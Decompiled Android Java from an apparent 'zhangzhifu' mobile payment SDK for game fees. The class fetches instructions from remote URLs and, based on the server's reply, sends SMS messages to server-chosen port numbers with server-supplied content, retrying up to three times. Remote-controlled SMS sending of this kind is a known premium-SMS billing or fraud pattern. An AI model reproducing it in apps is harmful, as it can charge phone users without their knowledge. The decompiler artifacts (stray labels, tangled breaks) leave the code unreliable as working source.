package com.zhangzhifu.sdk.onlinegame;

import android.os.AsyncTask;
import com.zhangzhifu.sdk.ZhangPayCallback;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.OnlineProcedure;
import com.zhangzhifu.sdk.modle.OnlineWap;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.JSonParser;
import com.zhangzhifu.sdk.util.json.MsgResponse;
import com.zhangzhifu.sdk.util.sms.SendSMS;
import java.util.List;
import org.apache.http.HttpResponse;

final class e
  extends AsyncTask
{
  e(ZhangPayOGF paramZhangPayOGF, OnlineWap paramOnlineWap) {}
  
  private String s()
  {
    int k = this.cx.getAllProcedure().size();
    if (k == 0) {
      return null;
    }
    int i = 0;
    Object localObject1 = null;
    label24:
    int j;
    Object localObject2;
    if (i < k)
    {
      ZhangPayOGF.a(this.cw, (OnlineProcedure)this.cx.getAllProcedure().get(i));
      ZhangPayLog.d("OnlineGameFee", "url是：" + ((OnlineProcedure)this.cx.getAllProcedure().get(i)).getA_url());
      if (ZhangPayOGF.a(this.cw) == null) {
        break label855;
      }
      ZhangPayOGF.a(this.cw, ZhangPayOGF.a(this.cw).getA_url());
      if ((ZhangPayOGF.b(this.cw) == null) || (ZhangPayOGF.b(this.cw).trim().equals(""))) {
        break label855;
      }
      j = 0;
      localObject2 = localObject1;
      if (j < 3) {
        break label169;
      }
      localObject1 = localObject2;
    }
    label162:
    label169:
    label513:
    label769:
    label855:
    for (;;)
    {
      i += 1;
      break label24;
      break;
      Object localObject3 = localObject2;
      do
      {
        do
        {
          do
          {
            try
            {
              localObject1 = Tools.getContentByCMWAP(ZhangPayOGF.b(this.cw) + "&contentid=" + (String)localObject2, Tools.getHeadersByDefault(ZhangPayOGF.c(this.cw), null, null), ZhangPayOGF.c(this.cw));
              localObject4 = localObject2;
              if (localObject1 != null)
              {
                localObject3 = localObject2;
                localObject1 = Tools.getBody((HttpResponse)localObject1, ZhangPayOGF.c(this.cw));
                localObject4 = localObject2;
                if (localObject1 != null)
                {
                  localObject3 = localObject2;
                  ZhangPayOGF.a(this.cw, JSonParser.getMsgResponse((String)localObject1));
                  localObject3 = localObject2;
                  localObject4 = ZhangPayOGF.d(this.cw).getContentsid();
                  localObject1 = localObject2;
                  if (localObject4 != null)
                  {
                    localObject1 = localObject2;
                    localObject3 = localObject2;
                    if (!"".equals(localObject4)) {
                      localObject1 = localObject4;
                    }
                  }
                  localObject3 = localObject1;
                  if (Integer.valueOf(ZhangPayOGF.d(this.cw).getStatus()).intValue() != 1) {
                    break label513;
                  }
                  localObject3 = localObject1;
                  if (Integer.valueOf(ZhangPayOGF.d(this.cw).getType()).intValue() != 1) {
                    break label513;
                  }
                  localObject3 = localObject1;
                  ZhangPayLog.i("zhangPay_log", "开始发短信");
                  localObject3 = localObject1;
                  localObject2 = this.cw;
                  localObject3 = localObject1;
                  ZhangPayOGF.l(ZhangPayOGF.c(this.cw), ZhangPayOGF.d(this.cw).getPort());
                  localObject3 = localObject1;
                  new SendSMS().sendSMS(ZhangPayOGF.c(this.cw), ZhangPayOGF.d(this.cw).getPort(), ZhangPayOGF.d(this.cw).getContent(), null);
                  localObject3 = localObject1;
                  Thread.sleep(ZhangPayOGF.a(this.cw).getTimer() * 1000);
                }
              }
            }
            catch (Exception localException)
            {
              ZhangPayLog.d("OnlineGameFee", "================发送短信发生错误");
              localObject4 = localObject3;
              j += 1;
              localObject2 = localObject4;
            }
            break;
            localObject3 = localException;
            if (Integer.valueOf(ZhangPayOGF.d(this.cw).getStatus()).intValue() == 1)
            {
              localObject3 = localException;
              if (Integer.valueOf(ZhangPayOGF.d(this.cw).getType()).intValue() == 0)
              {
                localObject3 = localException;
                localObject2 = this.cw.zhangPayCallback;
                localObject3 = localException;
                SharePreferUtil.getInstance();
                localObject3 = localException;
                ((ZhangPayCallback)localObject2).onZhangPayBuyProductOK(SharePreferUtil.getPriciePointId(ZhangPayOGF.c(this.cw)), "1001");
                localObject3 = localException;
                ZhangPayOGF.a(this.cw, ZhangPayOGF.c(this.cw));
                localObject3 = localException;
                Thread.sleep(ZhangPayOGF.a(this.cw).getTimer() * 1000);
                break label162;
              }
            }
            localObject3 = localException;
            localObject4 = localException;
          } while (Integer.valueOf(ZhangPayOGF.d(this.cw).getStatus()).intValue() != 1);
          localObject3 = localException;
          localObject4 = localException;
        } while (Integer.valueOf(ZhangPayOGF.d(this.cw).getType()).intValue() != 2);
        localObject3 = localException;
        ZhangPayLog.i("zhangPay_log", "BYTE发短信");
        localObject3 = localException;
        localObject2 = new SendSMS();
        localObject3 = localException;
        if (ZhangPayOGF.d(this.cw).getContent() != null) {
          break label769;
        }
        localObject3 = localException;
        localObject4 = localException;
      } while (ZhangPayOGF.d(this.cw).getContent().length() <= 0);
      localObject3 = localException;
      Object localObject4 = ZhangPayOGF.d(this.cw).getContent();
      localObject3 = localException;
      localObject4 = this.cw.getSmsContent((String)localObject4);
      localObject3 = localException;
      ((SendSMS)localObject2).sendSMS(ZhangPayOGF.c(this.cw), ZhangPayOGF.d(this.cw).getPort(), null, (byte[])localObject4);
      localObject3 = localException;
      Thread.sleep(ZhangPayOGF.a(this.cw).getTimer() * 1000);
    }
  }
}
